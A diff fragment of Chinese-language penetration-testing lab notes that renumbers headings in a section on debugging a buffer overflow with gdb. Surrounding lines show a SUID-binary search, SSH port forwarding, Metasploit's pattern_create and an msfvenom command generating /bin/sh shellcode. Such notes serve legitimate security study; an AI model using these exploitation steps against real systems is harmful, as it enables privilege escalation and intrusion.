@@ -480,7 +480,7 @@ find / -perm -u=s 2>/dev/null|grep -v '/proc\|^/run\|^/sys\|^/snap'
 `ssh -L 8000:127.0.0.1:8000`**内部端口转发**，一个是在kali，一个是在靶机
 
 5. `ltrace ./agent`也是**缓冲区溢出**的一种方法
-**gdb调试如下**
+5.1 gdb调试程序
 ```bash
 disas main # 查看是否有可能溢出的函数
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
@@ -506,7 +506,7 @@ msfvenom -a x86 -p linux/x86/exec CMD=/bin/sh -b '\x00\x09\x0a\x20' -e x86/shika
 ```
 ![alt text](image-6.png)
 
-5. gdb本地链接调试
+5.2 gdb本地链接调试
 ```bash
 # （set follow-fork-mode child）
 # （set detach-on-fork off） 看情况使用
